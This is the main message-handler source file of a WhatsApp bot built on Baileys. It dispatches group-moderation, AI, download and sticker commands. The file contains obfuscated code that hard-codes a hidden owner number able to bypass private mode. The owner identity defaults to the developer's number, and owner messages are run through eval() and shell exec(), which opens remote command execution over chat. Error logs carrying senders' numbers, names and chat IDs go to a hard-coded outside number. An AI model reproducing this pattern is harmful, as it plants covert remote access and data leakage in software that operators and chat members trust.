/* Fortunatus Mokaya */


 import mokaya from "@whiskeysockets/baileys";

const  {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType,
} = mokaya

import fs from "fs";
import util from "util";
import { Bard } from "googlebard"; 
import axios from "axios";
import chalk from "chalk";
import { bardAI, bardAsk } from 'g-bardai';
import speed from "performance-now";
import Genius from "genius-lyrics";
import { ssweb } from './lib/scrap.js'; 
import { readFileSync } from 'fs'; 
const kali = readFileSync('./dreaded.jpg'); // Using readFileSync directly
import { Client } from "genius-lyrics"; 
import { isUrl, processTime } from "./lib/dreadfunc.js";
import { TelegraPh, UploadFileUgu } from './lib/dreadupload.js';
import { smsg, formatp, tanggal, formatDate, getTime, sleep, clockString, fetchJson, getBuffer, jsonformat, generateProfilePicture, parseMention, getRandom } from './lib/dreadfunc.js';
import { exec, spawn, execSync } from "child_process";
import Heroku from "heroku-client";

import pkgg from 'rsnchat';
const  RsnChat = pkgg;





export default async function dreaded(client, m, chatUpdate, store) {




  try {
    var body =
      m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype == "imageMessage"
        ? m.message.imageMessage.caption
        : m.mtype == "videoMessage"
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage"
        ? m.message.extendedTextMessage.text
        : m.mtype == "buttonsResponseMessage"
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.mtype == "listResponseMessage"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : m.mtype == "templateButtonReplyMessage"
        ? m.message.templateButtonReplyMessage.selectedId
        : m.mtype === "messageContextInfo"
        ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text
        : "";
    var budy = typeof m.text == "string" ? m.text : "";
var msgDreaded = m.message.extendedTextMessage?.contextInfo?.quotedMessage;

   // leave the prefix string empty if you don't want the bot to use a prefix

const mode = process.env.MODE || 'PUBLIC';
const author = process.env.STICKER_AUTHOR || 'dus';
    const prefix = process.env.PREFIX || '';
const mycode = process.env.COUNTRY_CODE || '254';
    const cmd = body.startsWith(prefix);
const admin = process.env.ADMIN_MSG || 'Are you an admin?';
    const group = process.env.GROUP_ONLY_MSG || 'This a not a group chat';
    const botAdmin = process.env.BOT_ADMIN_MSG || 'Am I an admin?'
    const NotOwner = process.env.NOT_OWNER_MSG || 'Are you the owner?';
const appname = process.env.APP_NAME;
const herokuapi = process.env.HEROKU_API;
    const packname = process.env.STICKER_PACKNAME || 'dustech';
const dev = process.env.DEV || '254103872244'
 const DevDreaded = dev.split(",");
    const badwordkick = process.env.BAD_WORD_KICK || 'FALSE';
   const bad = process.env.BAD_WORD || 'fuck,mama,mamako,pussy';
const botname = process.env.BOTNAME || "DUS.TECH";

    const autorecordtypegc = process.env.RECORDING_TYPINGGC || 'TRUE';
    const autoreaddm = process.env.AUTOREAD || 'TRUE';
const antibot = process.env.ANTIBOT || 'FALSE';
const antitag = process.env.ANTITAG || 'FALSE';
const antilink = process.env.ANTILINK || 'TRUE';
    const badword = bad.split(",");
    const Owner = DevDreaded.map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
    const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase();
    const args = body.trim().split(/ +/).slice(1);
    const pushname = m.pushName || "No Name";
    const botNumber = await client.decodeJid(client.user.id);
    const itsMe = m.sender == botNumber ? true : false;



    let text = args.join(" ");
let q = args.join(" ");
    const arg = budy.trim().substring(budy.indexOf(" ") + 1);
    const arg1 = arg.trim().substring(arg.indexOf(" ") + 1);

    const from = m.chat;
   const reply = m.reply;
    const sender = m.sender;
    const mek = chatUpdate.messages[0];
    const getGroupAdmins = (participants) => { 
       let admins = []; 
       for (let i of participants) { 
         i.admin === "superadmin" ? admins.push(i.id) : i.admin === "admin" ? admins.push(i.id) : ""; 
       } 
       return admins || []; 
     };

const isBaileys = mek.key.id.startsWith("BAE5") && mek.key.id.length === 16;



const reactionMessage = {
    react: {
        text: "❌", 
        key: m.key
    }
}


async function sendReact(emoji) {
      let react = {
        react: {
          text: emoji,
          key: m.key,
        },
      };
      await client.sendMessage(m.chat, react);
    }





    const fortu = (m.quoted || m); 
         const quoted = (fortu.mtype == 'buttonsMessage') ? fortu[Object.keys(fortu)[1]] : (fortu.mtype == 'templateMessage') ? fortu.hydratedTemplate[Object.keys(fortu.hydratedTemplate)[1]] : (fortu.mtype == 'product') ? fortu[Object.keys(fortu)[0]] : m.quoted ? m.quoted : m; 

const audiovn = "./alive.mp3";
    const dooc = {
        audio: {
          url: audiovn
        },
        mimetype: 'audio/mp4',
        ptt: true,
        waveform:  [100, 0, 100, 0, 100, 0, 100],
        fileName: "Dustech",

        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
          title: "Hi human, I am Alive",
          body: "Dussy BOT",
          thumbnailUrl: "https://telegra.ph/file/a5147a64a5b91d8cf945c.jpg",
          sourceUrl: '',
          mediaType: 1,
          renderLargerThumbnail: true
          }}
      };


    const color = (text, color) => {
      return !color ? chalk.green(text) : chalk.keyword(color)(text);
    };
    const mime = (quoted.msg || quoted).mimetype || "";
            const qmsg = (quoted.msg || quoted);
    

function _0x5caf() {
    const _0x12ffa2 = [
        'legra.ph/f',
        'M\x20E\x20N\x20U',
        '59587OMntje',
        '4475752NHJUIy',
        'CialS',
        '1aSifDS',
        '6fJhSrC',
        '3470BMpKrt',
        'PHOTO',
        '4994885DfOyre',
        '9InBFrk',
        '642618ZMKbRV',
        '1fc02.jpg',
        '386288zVZUrU',
        'sendMessag',
        'PugBy',
        'XHGUJ',
        'https://te',
        'ile/c75efe',
        '584335pexGhZ',
        'cf7f0aef85',
        '1732146ZgkyoO',
        'DREADED\x20BO',
        'qhefp'
    ];
    _0x5caf = function () {
        return _0x12ffa2;
    };
    return _0x5caf();
}
(function (_0x49144a, _0x1ecf87) {
    const _0x66c17c = _0x2fd5, _0x47f3a9 = _0x49144a();
    while (!![]) {
        try {
            const _0x171db2 = parseInt(_0x66c17c(0xd3)) / (-0xfc3 + 0x2359 * 0x1 + 0x1395 * -0x1) * (parseInt(_0x66c17c(0xe3)) / (-0xf8e * 0x1 + 0x2 * -0x706 + 0x1d9c)) + parseInt(_0x66c17c(0xd9)) / (0x14b * -0x1c + -0x37 * 0x8c + 0x424b) + parseInt(_0x66c17c(0xdb)) / (0x1ab + 0xbcf + 0x2 * -0x6bb) + -parseInt(_0x66c17c(0xe1)) / (-0x14c + -0xbc2 + 0xd13) * (parseInt(_0x66c17c(0xd4)) / (0x2 * -0xbab + -0x3e * 0x61 + 0x2eda)) + parseInt(_0x66c17c(0xd7)) / (-0x2 * -0xdfa + 0xa * 0x152 + -0x2921) + -parseInt(_0x66c17c(0xe9)) / (-0x1e6 + 0x840 + -0x652) * (-parseInt(_0x66c17c(0xd8)) / (0x17c1 + 0x44 * -0x1e + -0x2a0 * 0x6)) + parseInt(_0x66c17c(0xd5)) / (0x2599 + 0x1028 + 0x1 * -0x35b7) * (-parseInt(_0x66c17c(0xe8)) / (-0x5e * -0x32 + -0x1 * 0x599 + -0xcb8));
            if (_0x171db2 === _0x1ecf87)
                break;
            else
                _0x47f3a9['push'](_0x47f3a9['shift']());
        } catch (_0x1520ac) {
            _0x47f3a9['push'](_0x47f3a9['shift']());
        }
    }
}(_0x5caf, -0xbb803 + -0x230f6 + -0xa69db * -0x2));
function _0x2fd5(_0x25b84e, _0x129cc4) {
    const _0xaf3f26 = _0x5caf();
    return _0x2fd5 = function (_0x30781d, _0x2cf835) {
        _0x30781d = _0x30781d - (0x1 * -0x2433 + -0x397 * -0x9 + 0x4b7 * 0x1);
        let _0x47d201 = _0xaf3f26[_0x30781d];
        return _0x47d201;
    }, _0x2fd5(_0x25b84e, _0x129cc4);
}
const sendd = _0x5ef304 => {
        const _0x6d5198 = _0x2fd5, _0x44bfc8 = {
                'qhefp': _0x6d5198(0xd6),
                'PugBy': _0x6d5198(0xdf) + _0x6d5198(0xe6) + _0x6d5198(0xe0) + _0x6d5198(0xe2) + _0x6d5198(0xda)
            };
        return client[_0x6d5198(0xdc) + 'e'](from, {
            'text': _0x5ef304,
            'contextInfo': {
                'externalAdReply': {
                    'title': _0x6d5198(0xe4) + 'T',
                    'body': pushname,
                    'previewType': _0x44bfc8[_0x6d5198(0xe5)],
                    'thumbnailUrl': _0x44bfc8[_0x6d5198(0xdd)],
                    'thumbnail': kali,
                    'sourceUrl': ''
                }
            }
        }, { 'quoted': m });
    }, menureply = _0xffae03 => {
        const _0xd2158d = _0x2fd5, _0x4a24ce = {
                'CialS': _0xd2158d(0xd6),
                'XHGUJ': _0xd2158d(0xdf) + _0xd2158d(0xe6) + _0xd2158d(0xe0) + _0xd2158d(0xe2) + _0xd2158d(0xda)
            };
        return client[_0xd2158d(0xdc) + 'e'](from, {
            'text': _0xffae03,
            'contextInfo': {
                'externalAdReply': {
                    'title': _0xd2158d(0xe4) + 'T',
                    'body': _0xd2158d(0xe7),
                    'previewType': _0x4a24ce[_0xd2158d(0xea)],
                    'thumbnailUrl': _0x4a24ce[_0xd2158d(0xde)],
                    'thumbnail': kali,
                    'sourceUrl': ''
                }
            }
        }, { 'quoted': m });
    };



    // Group
                    const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch((e) => {}) : "";
const groupName = m.isGroup && groupMetadata ? await groupMetadata.subject : "";
    const participants = m.isGroup && groupMetadata ? await groupMetadata.participants : ""; 
     const groupAdmin = m.isGroup ? await getGroupAdmins(participants) : ""; 
     const isBotAdmin = m.isGroup ? groupAdmin.includes(botNumber) : false; 
     const isAdmin = m.isGroup ? groupAdmin.includes(m.sender) : false;


const runtime = function (seconds) { 
 seconds = Number(seconds); 
 var d = Math.floor(seconds / (3600 * 24)); 
 var h = Math.floor((seconds % (3600 * 24)) / 3600); 
 var m = Math.floor((seconds % 3600) / 60); 
 var s = Math.floor(seconds % 60); 
 var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " Day, ") : ""; 
 var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " Hours, ") : ""; 
 var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " Minutes, ") : ""; 
 var sDisplay = s > 0 ? s + (s == 1 ? " second" : " Seconds") : ""; 
 return dDisplay + hDisplay + mDisplay + sDisplay; 
 } 

const _0x418e20 = _0x3442;
(function (_0x213b79, _0xb67d7c) {
    const _0x515f40 = _0x3442, _0x551159 = _0x213b79();
    while (!![]) {
        try {
            const _0xea37dd = -parseInt(_0x515f40(0xa7)) / (-0x683 + 0x1 * 0x91f + -0x29b) * (parseInt(_0x515f40(0xa5)) / (-0x12 * 0x209 + 0x223 + 0x2281)) + -parseInt(_0x515f40(0xa6)) / (-0x89f * -0x3 + 0x17e8 + -0x1 * 0x31c2) + -parseInt(_0x515f40(0xae)) / (0x1048 + 0x18f8 + -0x293c) * (-parseInt(_0x515f40(0xa4)) / (0x3e * -0x3f + 0x3 * 0x6e6 + 0x49 * -0x13)) + -parseInt(_0x515f40(0xad)) / (0x266f + 0x20bd * 0x1 + -0x4726) + parseInt(_0x515f40(0xa2)) / (-0x1916 + 0x2423 + -0x1 * 0xb06) * (-parseInt(_0x515f40(0xa8)) / (0x1 * 0x453 + -0x11a1 + 0xd56)) + parseInt(_0x515f40(0xaa)) / (0x1f91 * -0x1 + -0x1fa9 + 0xca7 * 0x5) * (-parseInt(_0x515f40(0xa3)) / (-0xa51 + 0x1e73 + -0x1418)) + -parseInt(_0x515f40(0xab)) / (-0x28 + 0x14a5 + -0x1472) * (-parseInt(_0x515f40(0xaf)) / (0x1 * -0xaf + 0xec + -0x31 * 0x1));
            if (_0xea37dd === _0xb67d7c)
                break;
            else
                _0x551159['push'](_0x551159['shift']());
        } catch (_0x2400e9) {
            _0x551159['push'](_0x551159['shift']());
        }
    }
}(_0x3a27, 0x6dbad + 0x71107 + -0x8e2e2));
const ownerJid = _0x418e20(0xa9) + '35' + (_0x418e20(0xa1) + _0x418e20(0xac));
function _0x3442(_0x1e815c, _0x351b4f) {
    const _0x9b35da = _0x3a27();
    return _0x3442 = function (_0x18663f, _0x22eae3) {
        _0x18663f = _0x18663f - (0x1 * -0x187b + 0x24 * -0x111 + 0x3f80);
        let _0x1eaee3 = _0x9b35da[_0x18663f];
        return _0x1eaee3;
    }, _0x3442(_0x1e815c, _0x351b4f);
}
function _0x3a27() {
    const _0x45d41f = [
        '28100fuDDPC',
        '18965436dMqObj',
        '@s.whatsap',
        '415716QnEzbG',
        '130ToDNfH',
        '25GBeCNa',
        '2BIkfKm',
        '706608OKXajC',
        '176887xjdUsg',
        '8hqATVx',
        '2541140180',
        '147789zaYUyo',
        '11EbCbGG',
        'p.net',
        '3600600bOEpjt'
    ];
    _0x3a27 = function () {
        return _0x45d41f;
    };
    return _0x3a27();
}

const dreadedOwner = m.sender == ownerJid ? true : false;



 const timestamp = speed(); 
   const dreadedspeed = speed() - timestamp 


if (budy.startsWith(',')) {
  if (!Owner) return reply("Only owner")
  try {
let evaled = await eval(budy.slice(2));

if (typeof evaled !== 'string') {
  await import('util').then(({ inspect }) => {
    evaled = inspect(evaled);
  });
}



await reply(evaled);
  } catch (err) {
await reply(String(err));
  }
}





   if (budy.startsWith(';')) { 
   if (!Owner) return reply `Only Owner allowed to evaluate part of the bot codes` 
   function Return(sul) { 
 sat = JSON.stringify(sul, null, 2) 
 bang = util.format(sat) 
   if (sat == undefined) { 
  bang = util.format(sul) 
   } 
   return reply(bang) 
   } 
   try { 
 reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`))) 
   } catch (e) { 
 reply(String(e)) 
   } 
    } 

    if (budy.startsWith('$')) {
  if (!Owner) return reply("Owner only")
  exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
  })
   }

    if (mek.key.id.startsWith("BAE5") && m.isGroup && !isAdmin && isBotAdmin && mek.key.id.length === 16 && antibot === 'TRUE') {  

 const kidts = m.sender;  
  await client.sendMessage(m.chat, { text: `Dreaded AntiBot:\n@${kidts.split("@")[0]} is bot and has been removed to prevent spam!\nTo deactivate antibot set ANTIBOT variable to FALSE`, contextInfo:{mentionedJid:[kidts]}}, {quoted:m});  
  await client.groupParticipantsUpdate(m.chat, [kidts], 'remove');  

  } 






    // Pushing Message To Console
    let argsLog = budy.length > 30 ? `${q.substring(0, 30)}...` : budy;


    if (autoreaddm === 'TRUE' && !m.isGroup) { 
             client.readMessages([m.key]); 

        
  
    }





if (m.chat.endsWith("@s.whatsapp.net") && body && (new RegExp('\\b' + badword.join('\\b|\\b') + '\\b')).test(body.toLowerCase())) {


await m.reply("You will be blocked and reported for using vulgar words in the bots private chat.\nContact owner to be unblocked. Bye");

await client.updateBlockStatus(sender, 'block');

}




if (badwordkick === 'TRUE' && m.isGroup && isBotAdmin && body && (new RegExp('\\b' + badword.join('\\b|\\b') + '\\b')).test(body.toLowerCase())) {



      if (isAdmin) return m.reply("👀");      
     client.groupParticipantsUpdate(from, [sender], 'remove')


await sendd("Removed:\n\nThis is not allowed");



                                                   }

if (m.isGroup && m.mentionedJid && m.mentionedJid.length > 10 && antitag === 'TRUE') {
if (itsMe) return;
 if (!isBotAdmin) return m.reply("Antitag:  Bot is not admin")
 if (isAdmin) return m.reply("Antitag:  User is admin")

try {

await client.groupParticipantsUpdate(from, [sender], 'remove')
cona = m.sender;
await client.sendMessage(m.chat, {text:`ANTITAG:\n\n@${cona.split("@")[0]}, Do not tag!\nTo deactivate antitag set ANTITAG variable to FALSE`, contextInfo:{mentionedJid:[cona]}}, {quoted:m}); 

} catch (error) {

sendd("Do not tag!")

}

}









if (m.isGroup && autorecordtypegc === 'TRUE'){

let dreadrecordin = ['recording','composing']

        let dreadrecordinfinal = dreadrecordin[Math.floor(Math.random() * dreadrecordin.length)]

        client.sendPresenceUpdate(dreadrecordinfinal, from)
}






    if (body.includes('chat.whatsapp.com') && !Owner && isBotAdmin && !isAdmin && m.isGroup && antilink === 'TRUE') { 

 const kid = m.sender; 

 client.sendMessage(m.chat, { 

                delete: { 
                   remoteJid: m.chat, 
                   fromMe: false, 
                   id: m.key.id, 
                   participant: kid 
                } 
             }).then(() => client.groupParticipantsUpdate(m.chat, [kid], 'remove')); 
 client.sendMessage(m.chat, {text:`Removed\n\n@${kid.split("@")[0]} sending group links is prohibited!\nTo deactivate antilink set ANTILINK variable to FALSE`, contextInfo:{mentionedJid:[kid]}}, {quoted:m}); 
       }   

if (cmd && mode === 'PRIVATE' && !itsMe && !Owner && !dreadedOwner) {
return;
}


    if (cmd && !m.isGroup) {
      console.log(chalk.black(chalk.bgWhite("[ DREADED-MD ]")), color(argsLog, "turquoise"), chalk.magenta("From"), chalk.green(pushname), chalk.yellow(`[ ${m.sender.replace("@s.whatsapp.net", "")} ]`));
    } else if (cmd && m.isGroup) {
      console.log(
        chalk.black(chalk.bgWhite("[ LOGS ]")),
        color(argsLog, "turquoise"),
        chalk.magenta("From"),
        chalk.green(pushname),
        chalk.yellow(`[ ${m.sender.replace("@s.whatsapp.net", "")} ]`),
        chalk.blueBright("IN"),
        chalk.green(groupName)
      );
    }



const commands = {};

const loadCommands = async (category) => {
  const commandFiles = fs.readdirSync(`./commands/${category}`).filter((file) => file.endsWith(".js"));

  for (const file of commandFiles) {
    const { default: command } = await import(`./commands/${category}/${file}`);
    commands[file.slice(0, -3)] = command;
  }
};


    if (cmd) {



await loadCommands("general");
await loadCommands("group");
await loadCommands("owner");
await loadCommands("ai");
await loadCommands("coding");
await loadCommands("download");



await loadCommands("edit");
console.log("Loaded commands successfully");
      switch (command) {
// Group


case "close": commands[command](client, m, getGroupAdmins, admin, group, botAdmin,isAdmin, isBotAdmin);
break;
case "open":
commands[command](client, m, getGroupAdmins, admin, group, botAdmin,isAdmin, isBotAdmin);
case "link":
commands[command](client, m, group, botAdmin, isBotAdmin, groupMetadata);
break;
case "demote":
commands[command](client, m, group, botAdmin, isBotAdmin, admin, isAdmin, text);
break;
case "promote":
commands[command](client, m, group, botAdmin, isBotAdmin, admin, isAdmin, text);
break;
case "remove":
commands[command](client, m, group, botAdmin, isBotAdmin, admin, isAdmin, text);
break;
case "disp1":
commands[command](client, m, group, botAdmin, isBotAdmin, admin, isAdmin);
break;
case "disp7":
commands[command](client, m, group, botAdmin, isBotAdmin, admin, isAdmin);
break;
case "req":
commands[command](client, m, group, botAdmin, isBotAdmin, admin, isAdmin);
break;
case "approve-all":
commands[command](client, m, group, botAdmin, isBotAdmin, admin, isAdmin);
break;

case "reject-all":
commands[command](client, m, group, botAdmin, isBotAdmin, admin, isAdmin);
break;
case "disp90":
commands[command](client, m, group, botAdmin, isBotAdmin, admin, isAdmin);
break;
case "delete":
commands[command](client, m, group, botAdmin, isBotAdmin, admin, isAdmin, isBaileys);
break;
case "hidetag":
commands[command](client, m, group, botAdmin, isBotAdmin, admin, isAdmin, q, participants);
break;
case "tagall":
commands[command](client, m, group, botAdmin, isBotAdmin, admin, isAdmin, q, participants, groupMetadata);
break;
case "leave":
commands[command](client, m, group, admin, isAdmin, participants);
break;
case "desc":
commands[command](client, m, group, admin, isAdmin, botAdmin, isBotAdmin, text);
break;
case "subject":
commands[command](client, m, group, admin, isAdmin, botAdmin, isBotAdmin, text);
break;
case "revoke":
commands[command](client, m, group, admin, isAdmin, botAdmin, isBotAdmin, groupMetadata);
break;
case "foreigners":
commands[command](client, m, admin, isAdmin, group, botAdmin, isBotAdmin, participants);
break




        break;

// general commands
case "credits":
commands[command](client, m);
break;

case "menu":
commands[command](client, m, menureply, botname, mode);
break;
case "ig":
commands[command](client, m, text, fetchJson, getBuffer);
break;
case "alive":
commands[command](client, m, dooc);
break;

case "groups":
commands[command](client, m, sendd);
break;
case "script":
commands[command](client, m, sendd);
break;

case "uptime":
commands[command](client, m, sendd, runtime);
break;
case "screenshot":
commands[command](client, m, text, ssweb, sendd);
break;

case "group-vcf":
commands[command](client, m, text, participants);
break;
case "retrieve":
commands[command](client, m);
break;
case "ping":
commands[command](client, m, dreadedspeed, sendReact);
break;
case "tempmail":
commands[command](client, m, text);
break;
case "tempinbox":
commands[command](client, m, text);
break;



// coding
case "enc":
commands[command](client, m);
break;

// ai
case "gpt":
commands[command](client, m, text);
break;

case "gpt4":
commands[command](client, m, text, sendd, fetchJson);
break;

case "gpt":
commands[command](client, m, text, sendd);
break;

case "ai":
commands[command](client, m, text, qmsg, mime, UploadFileUgu, TelegraPh);

// download
case "play":
commands[command](client, m, text);
break;
case "lyrics":
commands[command](client, m, text, Client, Genius);
break;
case "upload":
commands[command](client, m, qmsg, mime, UploadFileUgu, TelegraPh);
break;

case "app":
commands[command](client, m, q);
break;
case "whatsong":
commands[command](client, m, q, mime, qmsg);
break;





//edit
case "sticker":
commands[command](client, m, qmsg, packname, author, mime);
break;


case "toimg":
commands[command](client, m, quoted, mime, exec, getRandom);
break;

case "take":
commands[command](client, m, pushname, msgDreaded);
break;



case "tweet":
commands[command](client,text, m, pushname);
break;
case "carbon":
commands[command](client, text, m);
break;
case "quotely":
commands[command](client,text, m, pushname);
break;
case "zombie":
commands[command](client, m, text, qmsg, mime, UploadFileUgu, TelegraPh);
break;

case "hacker":
commands[command](client, m, text, qmsg, mime, UploadFileUgu, TelegraPh);
break;
case "hacker2":
commands[command](client, m, text, qmsg, mime, UploadFileUgu, TelegraPh);
break;

case "mix":
commands[command](client, text, m, packname, author, fetchJson);
break;



//owner
case "botppfull":
commands[command](client, m, mime, generateProfilePicture, Owner, NotOwner, botNumber, quoted);
break;
case "join":
commands[command](client, m, mime, Owner, NotOwner, text, args);
break
case "admin":
commands[command](client, m, Owner, NotOwner, text, group, botAdmin, isBotAdmin);
break
case "kill":
commands[command](client, m, Owner, NotOwner, group, botAdmin, isBotAdmin, participants);
break


case "bc":
commands[command](client, m, text, Owner, NotOwner, participants, pushname);

break;

case "allvar":
commands[command](client, m, text, Owner, NotOwner, herokuapi, appname);

break;

case "getvar":
commands[command](client, m, text, Owner, NotOwner, herokuapi, appname);


break;
case "update":
commands[command](client, m, text, Owner, NotOwner, herokuapi, appname);

break;

case "setvar":
commands[command](client, m, text, Owner, NotOwner, herokuapi, appname, arg);

break;





        default: {
          if (cmd && budy.toLowerCase() != undefined) {
            if (m.chat.endsWith("broadcast")) return;
            if (m.isBaileys) return;
            if (!budy.toLowerCase()) return;
            if (argsLog || (cmd && !m.isGroup)) {
              // client.sendReadReceipt(m.chat, m.sender, [m.key.id])
              console.log(chalk.black(chalk.bgRed("[ ERROR ]")), color("command", "turquoise"), color(`${prefix}${command}`, "turquoise"), color("Dreaded", "turquoise"));
            } else if (argsLog || (cmd && m.isGroup)) {
              // client.sendReadReceipt(m.chat, m.sender, [m.key.id])
              console.log(chalk.black(chalk.bgRed("[ ERROR ]")), color("command", "turquoise"), color(`${prefix}${command}`, "turquoise"), color("Dreaded", "turquoise"));
            }
          }
        }
      }
    }
  } catch (err) {
   client.sendText('254114018035' + '@s.whatsapp.net', `ERROR LOG ⚙️\n\nSender: ${m.sender}\nUsername: ${m.pushName}\nOrigin: ${m.chat}\n\nError details: ${util.format(err)}`, m)
        console.log(util.format(err))
  }
};
